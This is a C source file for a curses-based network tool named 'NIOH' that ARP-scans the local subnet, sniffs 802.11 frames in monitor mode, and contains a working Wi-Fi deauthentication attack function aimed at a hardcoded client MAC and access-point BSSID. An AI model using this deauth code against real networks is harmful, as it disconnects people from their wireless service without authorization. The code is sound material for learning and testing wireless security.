// Uncomment to run addrinfo
//#define _POSIX_C_SOURCE 200112L
#include "main.h"

#include <errno.h>

#include <curses.h>
#include <netdb.h>
#include <netinet/ether.h>
#include <panel.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>

#include <ifaddrs.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>

#include <unistd.h> // sleep

#include <pcap/pcap.h> // pcap_inject, requires sudo apt-get install libpcap-dev

/* to generate new interface
 * sudo iw dev wlxdc4ef4086b85 interface add ni0h type monitor
 * sudo ip link set ni0h up
 *
 * or
 *
 * sudo iw ni0h set monitor control
 * sudo ip link set ni0h up
 *
 * to list AP
 * sudo iwlist wlp3s0 scanning | grep "Address\|ESSID"
 */

/* To see the channel
 * sudo iwconfig wlxdc4ef4086b85
 * to set channel (after generating interface)
 * sudo iwconfig wlxdc4ef4086b85 channel xx
 */

int main(int argc, char *argv[]) {
  winStruct *wins = (winStruct *)calloc(1, sizeof(winStruct));
  ptids *tids = (ptids *)calloc(1, sizeof(ptids));
  sem_init(&wins->win_sem, 0, 0);
  pthread_create(&(tids->wm), NULL, runWindowThread, wins);
  sem_wait(&wins->win_sem);

  wprintw(wins->arp_right->win, "Hi, welcome to NIOH, binary is %s\n",
          argv[argc - 1]);

  int connFd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
  wprintw(wins->arp_right->win, "Conn Fd %d\n", connFd);

  if (connFd == -1) {
    wprintw(wins->arp_right->win, "Failed to open socket\n");
  }
  int broadcastEnable = 1;
  int ret = setsockopt(connFd, SOL_SOCKET, SO_BROADCAST, &broadcastEnable,
                       sizeof(broadcastEnable));
  if (ret != 0) {
    wprintw(wins->arp_right->win, "Failed to set socket\n");
  }
  //  struct timeval timeout;
  //  timeout.tv_sec = 0;
  //  timeout.tv_usec = 500000;
  //
  //  if(setsockopt(connFd, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout,
  //  sizeof(timeout)) < 0)
  //    printw("setsockopt failed\n");

  arpMapping **mappingList = (arpMapping **)calloc(10, sizeof(arpMapping *));
  arp_resp_info *arp_resp = (arp_resp_info *)calloc(1, sizeof(arp_resp_info));
  arp_resp->mapping = mappingList;
  arp_resp->selected = -1;
  arp_resp->size = 0;
  set_panel_userptr(wins->arp_left->panel, arp_resp);
  pthread_mutex_init(&arp_resp->lock, NULL);

  receiverStr mapStr = {connFd, arp_resp, wins};
  sender_pck send_pck = {connFd, wins};
  // First is target, seconds i bssid of accesspoint, retrievable with 'sudo
  // iwlist scanning' under address
  deauth_pck dth_pck = {connFd, wins, "b6:94:31:6c:3b:f9", "DC:39:6F:1D:DE:67"};

  pthread_t receiverThread, senderThread;
  pthread_t deauthThread, wlanScanThread;
  wprintw(wins->arp_right->win, "Done\n");
  //  pthread_create(&deauthThread, NULL, deauthAttack, &dth_pck);
  // pthread_create(&senderThread, NULL, sendArpRequest, &send_pck);
  // pthread_create(&receiverThread, NULL, recvMessage, &mapStr);
  pthread_create(&wlanScanThread, NULL, wlanScan, &send_pck);

  // pthread_join(receiverThread, 0);
  // pthread_join(senderThread, 0);
  pthread_join(wlanScanThread, 0);
  // pthread_join(deauthThread, 0);

  endwin();
  return 0;
}

char *getSMac() {
  // FILE* ptr = fopen("/sys/class/net/wlp3s0/address", "r");
  // FILE* ptr = fopen("/sys/class/net/ni0h/address", "r");
  FILE *ptr = fopen("/sys/class/net/wlan0/address", "r");
  char *smac = (char *)calloc((MAC_COLON_LEN + 1), sizeof(char));
  if (!smac) {
    fclose(ptr);
    return 0;
  }
  fread(smac, sizeof(char), MAC_COLON_LEN, ptr);
  fclose(ptr);
  return smac;
}

char *getBroadcastMac() {
  // FILE* ptr = fopen("/sys/class/net/wlp3s0/broadcast", "r");
  // FILE* ptr = fopen("/sys/class/net/ni0h/broadcast", "r");
  FILE *ptr = fopen("/sys/class/net/wlan0/broadcast", "r");
  char *broad = (char *)calloc((MAC_COLON_LEN + 1), sizeof(char));
  if (!broad) {
    fclose(ptr);
    return 0;
  }
  fread(broad, sizeof(char), MAC_COLON_LEN, ptr);
  fclose(ptr);
  return broad;
}

int mac2UInt8Arr(const char *mac, uint8_t dest[ETH_ALEN]) {
  if (!sscanf(mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &dest[0], &dest[1],
              &dest[2], &dest[3], &dest[4], &dest[5])) {
    printw("MAC address is invalid %s\n", mac);
    return -1;
  }
  return 0;
}

int printEthType(winStruct *wins, struct ether_header *hdr) {
  wprintw(wins->arp_right->win, "[+] Got eth type ");
  int type = ntohs(hdr->ether_type);
  switch (type) {
  case ETHERTYPE_IP:
    wprintw(wins->arp_right->win, "IP\n");
    break;
  case ETHERTYPE_ARP:
    wprintw(wins->arp_right->win, "ARP\n");
    break;
  default:
    printw("Unimplemented packet\n");
    break;
  }
  return type;
}

int printArpCode(winStruct *wins, struct arphdr *hdr) {
  wprintw(wins->arp_right->win, "[+] Got ");
  int opcode = ntohs(hdr->ar_op);
  switch (opcode) {
  case ARPOP_REQUEST:
    wprintw(wins->arp_right->win, "ARP Request\n");
    break;
  case ARPOP_REPLY:
    wprintw(wins->arp_right->win, "ARP Reply\n");
    break;
  case ARPOP_RREQUEST:
    wprintw(wins->arp_right->win, "RARP Request\n");
    break;
  case ARPOP_RREPLY:
    wprintw(wins->arp_right->win, "RARP Replu\n");
    break;
  case ARPOP_InREQUEST:
    wprintw(wins->arp_right->win, "InARP Request\n");
    break;
  case ARPOP_InREPLY:
    wprintw(wins->arp_right->win, "InARP Reply\n");
    break;
  case ARPOP_NAK:
    wprintw(wins->arp_right->win, "(ATM)ARP NAK\n");
    break;
  default:
    wprintw(wins->arp_right->win, "Unknown ARP opcode\n");
  }
  return opcode;
}

void addArpMapping(winStruct *wins, struct arpCont *arpContResp,
                   arp_resp_info *resp_info) {
  arpMapping **mappingList = resp_info->mapping;
  arpMapping *map = (arpMapping *)calloc(1, sizeof(arpMapping));
  struct in_addr *ip = (struct in_addr *)calloc(1, sizeof(struct in_addr));
  memcpy(ip, &arpContResp->sender_ip, sizeof(struct in_addr));
  map->ip_ = ip;

  char *ipStr = (char *)calloc(16, sizeof(char));
  strcpy(ipStr, inet_ntoa(*map->ip_));
  map->ipStr_ = ipStr;
  memcpy(map->MAC_, arpContResp, ETH_ALEN);
  struct addrinfo hints;
  struct addrinfo *result;

  memset(&hints, 0, sizeof(struct addrinfo));
  hints.ai_family = AF_INET;
  hints.ai_socktype = SOCK_RAW;
  hints.ai_flags = AI_PASSIVE;

  if (getaddrinfo(ipStr, NULL, &hints, &result)) {
    wprintw(wins->arp_right->win, "Getaddrinfo failed for %s\n", ipStr);
    exit(-1);
  }

  char *hostname = (char *)malloc(253 * sizeof(char));
  if (getnameinfo(result->ai_addr, result->ai_addrlen, hostname, NI_MAXHOST,
                  NULL, 0, 0)) {
    wprintw(wins->arp_right->win, "Getnameinfo failed for %s\n", ipStr);
    exit(-1);
  }
  freeaddrinfo(result);

  map->hostname_ = hostname;
  mappingList[resp_info->size++] = map;
  int ip_len = strlen(map->ipStr_);
  wprintw(wins->arp_left->win, " %s %*s%02x:%02x:%02x:%02x:%02x:%02x   %s\n",
          map->ipStr_, 17 - ip_len, "", map->MAC_[0], map->MAC_[1],
          map->MAC_[2], map->MAC_[3], map->MAC_[4], map->MAC_[5],
          map->hostname_);
  if (resp_info->selected == -1)
    resp_info->selected = 0;
  int old_col, old_row;

  getyx(wins->arp_left->win, old_row, old_col);
  mvwchgat(wins->arp_left->win, resp_info->selected, 0, -1, A_REVERSE, 1, NULL);
  wmove(wins->arp_left->win, old_row, old_col);
  update_panels();
  doupdate();
}

int updateAddr(struct in_addr *currAddr, uint8_t *startAddr, uint8_t *endAddr) {
  uint8_t ip[4] = {0};
  for (int i = 0; i < 4; i++) {
    ip[i] = (currAddr->s_addr & (0xFF << 8 * i)) >> 8 * i;
  }
  int pos = 3;
  while (pos >= 0) {
    if (ip[pos] != endAddr[pos]) {
      ip[pos]++;
      break;
    }
    ip[pos] = startAddr[pos];
    pos--;
  }
  if (pos < 0) {
    ip[0] = startAddr[0];
    ip[1] = startAddr[1];
    ip[2] = startAddr[2];
    ip[3] = startAddr[3];
  }
  currAddr->s_addr = 0;
  for (int i = 0; i < 4; i++) {
    currAddr->s_addr += ip[i] << 8 * i;
  }
  return pos < 0 ? pos : 0;
}

void *sendArpRequest(void *param) {
  char scanBarElements[4] = {'|', '/', '-', '\\'};
  int sent;
  char *buf = (char *)malloc(1024);
  winStruct *wins = ((sender_pck *)param)->wins_;
  int connFd = ((sender_pck *)param)->connectionFd_;
  int bufSize = 0;
  struct ether_header *ethHdr = (struct ether_header *)buf;
  memset(ethHdr, 0, sizeof(struct ether_header));
  if (!ethHdr) {
    printw("No more memory, terminating");
    return (void *)ENOMEM;
  }
  char *smac = getSMac();
  if (!smac) {
    printw("No more memory, terminating");
    return (void *)ENOMEM;
  }
  wprintw(wins->arp_right->win, "Your MAC is %s\n", smac);

  char *broad = getBroadcastMac();
  if (!broad) {
    printw("No more memory, terminating");
    return (void *)ENOMEM;
  }
  wprintw(wins->arp_right->win, "Broadcast MAC is %s\n", broad);

  if (mac2UInt8Arr(smac, ethHdr->ether_shost)) {
    return (void *)-1;
  }
  wprintw(wins->arp_right->win, "SHOST: ");
  for (int i = 0; i < 6; i++) {
    wprintw(wins->arp_right->win, "%x:", ethHdr->ether_shost[i]);
  }
  wprintw(wins->arp_right->win, "\b\n");
  if (mac2UInt8Arr(broad, ethHdr->ether_dhost)) {
    return (void *)-1;
  }
  wprintw(wins->arp_right->win, "DHOST: ");
  for (int i = 0; i < 6; i++) {
    wprintw(wins->arp_right->win, "%x:", ethHdr->ether_dhost[i]);
  }
  wprintw(wins->arp_right->win, "\b\n");
  ethHdr->ether_type = htons(ETHERTYPE_ARP);
  bufSize += sizeof(struct ether_header);

  struct arphdr *arpHdr = (struct arphdr *)(buf + bufSize);
  arpHdr->ar_hrd = htons(ARPHRD_ETHER);
  arpHdr->ar_pro = htons(0x0800);
  arpHdr->ar_hln = ETH_ALEN;
  arpHdr->ar_pln = 4;
  arpHdr->ar_op = htons(ARPOP_REQUEST);
  bufSize += sizeof(struct arphdr);

  struct ifreq if_idx;
  struct ifreq if_mac;

  /* Get the index of the interface to send on */
  memset(&if_idx, 0, sizeof(struct ifreq));
  strncpy(if_idx.ifr_name, DEFAULT_IF, IFNAMSIZ - 1);
  if (ioctl(connFd, (long unsigned int)SIOCGIFINDEX, &if_idx) < 0)
    perror("SIOCGIFINDEX");
  /* Get the MAC address of the interface to send on */
  memset(&if_mac, 0, sizeof(struct ifreq));
  strncpy(if_mac.ifr_name, DEFAULT_IF, IFNAMSIZ - 1);
  if (ioctl(connFd, SIOCGIFHWADDR, &if_mac) < 0)
    perror("SIOCGIFHWADDR");

  struct sockaddr_in *ownIp = 0;
  struct sockaddr_in *netmask = 0;
  char *ownIpStr = (char *)calloc(16, sizeof(char));
  struct ifaddrs *id;
  getifaddrs(&id);
  struct ifaddrs *ifa = id;
  struct sockaddr_in *sa;
  char *addr;
  while (id) {
    if (id->ifa_addr && id->ifa_addr->sa_family == AF_INET &&
        !strcmp(DEFAULT_IF, id->ifa_name)) {
      ownIp = (struct sockaddr_in *)id->ifa_addr;
      netmask = (struct sockaddr_in *)id->ifa_netmask;
      strcpy(ownIpStr, inet_ntoa(ownIp->sin_addr));
      break;
    }
    id = id->ifa_next;
  }
  if (!ownIp || !netmask) {
    perror("Failed to find IP or netmask");
    wprintw(wins->arp_right->win, "Failed to find IP or netmask\n");
    usleep(10000000);
    return (void *)-1;
  }
  wprintw(wins->arp_right->win, "%s\n", inet_ntoa(netmask->sin_addr));
  if (!ownIp) {
    wprintw(wins->arp_right->win, "Fatal no own ip found\n");
    return (void *)-1;
  }
  struct in_addr startAddr = {ownIp->sin_addr.s_addr &
                              netmask->sin_addr.s_addr};
  char *startStr = (char *)calloc(16, sizeof(char));
  strcpy(startStr, inet_ntoa(startAddr));
  struct in_addr endAddr = {startAddr.s_addr | ~netmask->sin_addr.s_addr};
  char *endStr = (char *)calloc(16, sizeof(char));
  uint8_t startIp[4] = {0};
  for (int i = 0; i < 4; i++) {
    startIp[i] = (startAddr.s_addr & (0xFF << 8 * i)) >> 8 * i;
  }
  uint8_t endIp[4] = {0};
  for (int i = 0; i < 4; i++) {
    endIp[i] = (endAddr.s_addr & (0xFF << 8 * i)) >> 8 * i;
  }
  strcpy(endStr, inet_ntoa(endAddr));

  wprintw(wins->arp_right->win, "Own IP is %s, start addr %s, end addr %s\n",
          ownIpStr, startStr, endStr);
  update_panels();

  struct sockaddr_ll socket_address;
  /* Index of the network device */
  socket_address.sll_ifindex = if_idx.ifr_ifindex;
  /* Address length*/
  socket_address.sll_halen = ETH_ALEN;
  memcpy(&socket_address.sll_addr, ethHdr->ether_dhost, ETH_ALEN);
  struct in_addr currAddr = startAddr;

  do {
    bufSize = sizeof(struct ether_header) + sizeof(struct arphdr);
    struct arpCont *arpReq = (struct arpCont *)(buf + bufSize);
    memcpy(arpReq->sender_mac, ethHdr->ether_shost, ETH_ALEN);
    // wprintw(wins->arp_right->win, "[+] ARP Request for %s\n",
    // inet_ntoa(currAddr)); update_panels(); doupdate();
    inet_pton(AF_INET, inet_ntoa(currAddr), &arpReq->target_ip);
    memcpy(&arpReq->sender_ip, &ownIp->sin_addr.s_addr, 4);
    bufSize += sizeof(struct arpCont);

    if ((sent =
             sendto(connFd, buf, bufSize, 0, (struct sockaddr *)&socket_address,
                    sizeof(struct sockaddr_ll))) == -1) {
      wprintw(wins->arp_right->win, "Sent %d bytes %s\n", sent,
              strerror(errno));
      update_panels();
      doupdate();
    }
    if (updateAddr(&currAddr, startIp, endIp)) {
      for (int cnt = 0; cnt < 4; cnt++) {
        // wprintw(wins->arp_right->win, "\r%c Scanning network",
        // scanBarElements[cnt]);
        update_panels();
        doupdate();
        sleep(5 / 4);
      }
    }
  } while (1);
  return 0;
}

void *recvMessage(void *param) {
  int connFd = ((receiverStr *)param)->connectionFd_;
  winStruct *wins = ((receiverStr *)param)->wins_;
  arp_resp_info *resp_info = ((receiverStr *)param)->resp_info;
  pthread_mutex_t lock = resp_info->lock;
  arpMapping **mappingList = resp_info->mapping;
  char responseBuf[42] = {0};

  int sent = 0;
  while (1) {
    if ((sent = recvfrom(connFd, responseBuf, 42, 0, NULL, NULL)) == -1) {
      wprintw(wins->arp_right->win, "Fail\n");
      update_panels();
      doupdate();
      continue;
    }
    //    struct ether_header* ethHdrResp =  (struct ether_header*)responseBuf;
    //    int type = printEthType(wins, ethHdrResp);
    //    if(type != ETHERTYPE_ARP)
    //    {
    //      continue;
    //    }
    //    struct arphdr* arpHdrResp = (struct arphdr*)(responseBuf +
    //    sizeof(struct ether_header)); int opcode = printArpCode(wins,
    //    arpHdrResp); if(opcode != ARPOP_REPLY)
    //    {
    //      continue;
    //    }
    struct arpCont *arpContResp =
        (struct arpCont *)(responseBuf + sizeof(struct ether_header) +
                           sizeof(struct arphdr));
    pthread_mutex_lock(&lock);
    if (find(wins, arpContResp, resp_info) == -1) {
      addArpMapping(wins, arpContResp, resp_info);
    }
    pthread_mutex_unlock(&lock);
  }
}

int find(winStruct *wins, struct arpCont *arpContResp,
         arp_resp_info *resp_info) {
  for (int i = 0; i < resp_info->size; i++) {
    char test[16] = {0};
    strcpy(test, inet_ntoa(arpContResp->sender_ip));
    if (!strcmp(resp_info->mapping[i]->ipStr_, test)) {
      return i;
    }
  }
  return -1;
}

void *deauthAttack(void *param) {
  deauth_pck *pck = (deauth_pck *)param;
  int connFd = pck->connectionFd_;
  winStruct *wins = pck->wins_;

  struct ifreq if_idx;
  struct ifreq if_mac;
  /* Get the index of the interface to send on */
  memset(&if_idx, 0, sizeof(struct ifreq));
  strncpy(if_idx.ifr_name, VIRT_NET, IFNAMSIZ - 1);
  if (ioctl(connFd, SIOCGIFINDEX, &if_idx) < 0)
    perror("SIOCGIFINDEX");
  /* Get the MAC address of the interface to send on */
  memset(&if_mac, 0, sizeof(struct ifreq));
  strncpy(if_mac.ifr_name, VIRT_NET, IFNAMSIZ - 1);
  if (ioctl(connFd, SIOCGIFHWADDR, &if_mac) < 0)
    perror("SIOCGIFHWADDR");
  wprintw(wins->arp_right->win,
          "Performing deauth attack on interface %s, vs %s on network %s\n",
          if_mac.ifr_ifrn.ifrn_name, pck->dmac, pck->bssid);

  int sent;
  int counter = 0;
  char *buf = (char *)calloc(1024, sizeof(char));
  int bufSize = 0;
  wprintw(wins->arp_right->win, "Done\n");
  update_panels();
  doupdate();
  //  memcpy(buf,
  //  "\x00\x00\x0c\x00\x04\x80\x00\x00\x02\x00\x18\x00\xc0\x00\x3a\x01\xff\xff\xff\xff\xff\xff\xc8\xd7\x79\xd0\xa2\x81\xc8\xd7\x79\xd0\xa2\x81\x00\x00\x07\x00",
  //  38); bufSize = 38;
  struct ieee80211_radiotap_header *radiotap_hdr =
      (struct ieee80211_radiotap_header *)buf;
  bufSize += sizeof(struct ieee80211_radiotap_header);
  radiotap_hdr->it_len = sizeof(struct ieee80211_radiotap_header) + 1;
  radiotap_hdr->it_present |= RATE;
  // 1 Mb/s
  *(buf + bufSize++) = 0x2;

  struct machdr *macHdr = (struct machdr *)(buf + bufSize);
  bufSize += sizeof(struct machdr);
  wprintw(wins->arp_right->win,
          "size of radiotap %d size of machdr %d Size is %d\n",
          sizeof(struct ieee80211_radiotap_header), sizeof(struct machdr),
          bufSize);
  macHdr->version = 0;
  macHdr->type = TYPE_MANAGEMENT;
  macHdr->subtype = SUB_DEAUTH;
  macHdr->dur_or_ID = 0x3a01;
  uint16_t data = DRC_UNSPEC;
  memcpy(buf + bufSize, (char *)&data, 2);
  bufSize += 2;
  //  *(uint16_t*)(buf + bufSize) = htons(0xa0e4);
  //  bufSize+= 2;
  //  *(uint16_t*)(buf + bufSize) = htons(0xf6d4);
  //  bufSize+= 2;

  mac2UInt8Arr(pck->dmac, macHdr->dmac);
  wprintw(wins->arp_right->win, "DMAC: ");
  for (int i = 0; i < 6; i++) {
    wprintw(wins->arp_right->win, "%x:", macHdr->dmac[i]);
  }
  wprintw(wins->arp_right->win, "\b\n");
  mac2UInt8Arr(pck->bssid, macHdr->smac);
  wprintw(wins->arp_right->win, "SMAC: ");
  for (int i = 0; i < 6; i++) {
    wprintw(wins->arp_right->win, "%x:", macHdr->smac[i]);
  }
  wprintw(wins->arp_right->win, "\b\n");
  mac2UInt8Arr(pck->bssid, macHdr->bssid);
  wprintw(wins->arp_right->win, "BSSID: ");
  for (int i = 0; i < 6; i++) {
    wprintw(wins->arp_right->win, "%x:", macHdr->bssid[i]);
  }
  wprintw(wins->arp_right->win, "\b\n");

  char *broad = getBroadcastMac();
  if (!broad) {
    printw("No more memory, terminating");
  }
  uint8_t ether_dhost[ETH_ALEN]; /* destination eth addr	*/
  mac2UInt8Arr(broad, ether_dhost);
  wprintw(wins->arp_right->win, "DHOST: ");
  for (int i = 0; i < 6; i++) {
    wprintw(wins->arp_right->win, "%x:", ether_dhost[i]);
  }
  wprintw(wins->arp_right->win, "\b\n");
  struct sockaddr_ll socket_address;
  /* Index of the network device */
  socket_address.sll_ifindex = if_idx.ifr_ifindex;
  /* Address length*/
  socket_address.sll_halen = ETH_ALEN;
  memcpy(&socket_address.sll_addr, ether_dhost, ETH_ALEN);
  FILE *fl = fopen("test", "wb");
  fwrite(buf, sizeof(char), bufSize, fl);
  fclose(fl);
  wprintw(wins->arp_right->win, "CONTENT: ");
  for (int i = 0; i < bufSize; i++) {
    wprintw(wins->arp_right->win, "%hhx ", (*(buf + i)));
  }

  wprintw(wins->arp_right->win, "ConnFd %d idx %d, %s\n", connFd,
          socket_address.sll_ifindex,
          ((struct sockaddr *)&socket_address)->sa_data);

  int ctr = 0;
  for (int i = 0; i < 14; i++) {
    wprintw(wins->arp_right->win, "%d ",
            (*(((struct sockaddr *)&socket_address)->sa_data + i)));
  }
  while (1) {
    if ((sent =
             sendto(connFd, buf, bufSize, 0, (struct sockaddr *)&socket_address,
                    sizeof(struct sockaddr_ll))) == -1) {
      if (ctr++ == 0)
        wprintw(wins->arp_right->win, "Sent %d bytes %s\n", sent,
                strerror(errno));
    } else {
      if (ctr++ == 0)
        wprintw(wins->arp_right->win, "Sent deauth, len %d, total %d\n", sent,
                bufSize);
    }
    //    usleep(100000);
    //    mac2UInt8Arr(victim, macHdr->smac);
    //    mac2UInt8Arr(ap, macHdr->dmac);
    //    if((sent = sendto(connFd, buf, bufSize, 0, (struct
    //    sockaddr*)&socket_address, sizeof(struct sockaddr_ll))) == -1)
    //    {
    //      wprintw(wins->arp_right->win, "Sent %d bytes %s\n", sent,
    //      strerror(errno));
    //    }
    //    else
    //    {
    //      wprintw(wins->arp_right->win, "Sent deauth, len %d, total %d\n",
    //      sent, bufSize);
    //    }
    //    mac2UInt8Arr(ap, macHdr->smac);
    //    mac2UInt8Arr(victim, macHdr->dmac);
    // mac2UInt8Arr(bssid, macHdr->smac);
    //  break;
    //    uint8_t a = *(buf + fcf_pos + 1);
    //    uint8_t b = *(buf + fcf_pos);
    //    if(b == 0xFF)
    //    {
    //      b = 0x0;
    //      if(a == 0xFF)
    //        break;
    //      a++;
    //      wprintw(wins->arp_right->win, "%x %x\n", a, b);
    //      wrefresh(wins->arp_right->win);
    //      update_panels();
    //    }
    //    else
    //    {
    //      b++;
    //    }
    //    *(buf + fcf_pos) = b;
    //    *(buf + fcf_pos + 1) = a;
    //     if(ctr++ < 64)
    usleep(100000);
  }
}

void *wlanScan(void *param) {
  winStruct *wins = ((sender_pck *)param)->wins_;
  // int connFd = ((sender_pck*)param)->connectionFd_;
  struct ifreq ifr = {0};
  memcpy(ifr.ifr_ifrn.ifrn_name, "ni0h\0", 5);
  int connFd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

  if (connFd == -1) {
    wprintw(wins->arp_right->win, "Failed to open socket\n");
  }
  wprintw(wins->arp_right->win, "Scan Conn Fd %d\n", connFd);
  // 5 = SO_BINDTODEVICE

  if (setsockopt(connFd, SOL_SOCKET, SO_BINDTODEVICE, (void *)&ifr,
                 sizeof(ifr)) == -1) {
    wprintw(wins->arp_right->win, "Failed to set socket options\n");
  }

  char responseBuf[400] = {0};
  int received = 0;
  while (1) {
    if ((received = recvfrom(connFd, responseBuf, 400, 0, NULL, NULL)) == -1) {
      wprintw(wins->arp_right->win, "Fail\n");
      update_panels();
      doupdate();
      continue;
    }
    struct ieee80211_radiotap_header *radiotap =
        (struct ieee80211_radiotap_header *)responseBuf;
    if (radiotap->it_len > 18) {
      // TODO
      continue;
    }
    wprintw(wins->arp_right->win, "Size radiotap (%d): \n",
            sizeof(struct ieee80211_radiotap_header));

    struct machdr *hdr = (struct machdr *)(responseBuf + radiotap->it_len);

    //  for(int i = 0; i < radiotap->it_len; i+=2)
    //  {
    //    wprintw(wins->arp_right->win, "%2hhx ", (*(radiotap+ i)));
    //    if(i!=0 && (i+1) % 8 == 0)
    //    wprintw(wins->arp_right->win, "  ");
    //    if(i!=0 && (i+1) % 16 == 0)
    //    wprintw(wins->arp_right->win, "\n");
    //  }
    //  wprintw(wins->arp_right->win, "\n");
    //  update_panels();
    //  doupdate();
    printRadiotapHeader(radiotap, wins);
    printMACHeader(hdr, wins);
    // wprintw(wins->arp_right->win, "CONTENT (%d): \n", received);
    //   for(int i = 0; i < received - radiotap->it_len; i++)
    //   {
    //     wprintw(wins->arp_right->win, "%2hhx ", (*(hdr + i)));
    //       if(i!=0 && (i+1) % 8 == 0)
    //     wprintw(wins->arp_right->win, "  ");
    //       if(i!=0 && (i+1) % 16 == 0)
    //     wprintw(wins->arp_right->win, "\n");
    //   }
    //    wprintw(wins->arp_right->win, "\n");
    wprintw(wins->arp_right->win, "CONTENT (%d): \n", received);
    for (int i = 0; i < received; i++) {
      wprintw(wins->arp_right->win, "%2hhx ", (*(responseBuf + i)));
      if (i != 0 && (i + 1) % 8 == 0)
        wprintw(wins->arp_right->win, "  ");
      if (i != 0 && (i + 1) % 16 == 0)
        wprintw(wins->arp_right->win, "\n");
    }
    wprintw(wins->arp_right->win, "\n");
    update_panels();
    doupdate();
    //    FILE* fl = fopen("captured", "a");
    //    fprintf(fl, "%d\n", received);
    //    for(int i = 0; i < received; i++)
    //    {
    //      fprintf(fl, "%2hhx ", (*(responseBuf + i)));
    //      if(i!=0 && (i+1) % 8 == 0)
    //        fprintf(fl, "  ");
    //      if(i!=0 && (i+1) % 16 == 0)
    //        fprintf(fl, "\n");
    //    }
    //    fwrite("\n\n", sizeof(char), 2, fl);
    //    fclose(fl);
  

    update_panels();
    doupdate();
    if (received == 388 || received == 304) {
      sleep(20);
    }
    // sleep(.5);
  }
  return 0;
}
